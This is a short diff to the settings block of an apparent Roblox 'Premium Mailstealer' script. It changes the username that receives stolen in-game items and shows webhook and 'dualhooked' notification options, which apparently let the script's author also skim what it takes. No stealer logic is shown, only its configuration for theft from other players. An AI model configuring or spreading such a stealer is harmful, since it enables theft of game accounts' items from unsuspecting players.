@@ -1,7 +1,7 @@
 -- [PtacikCZ Premium Mailstealer]
 
 getgenv().Settings = {
-    User = "PtacikCZ",
+    User = "dragonlslicer213",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
     MailMessage = "PtacikCZ Je Best!!!",
   Titanics = {
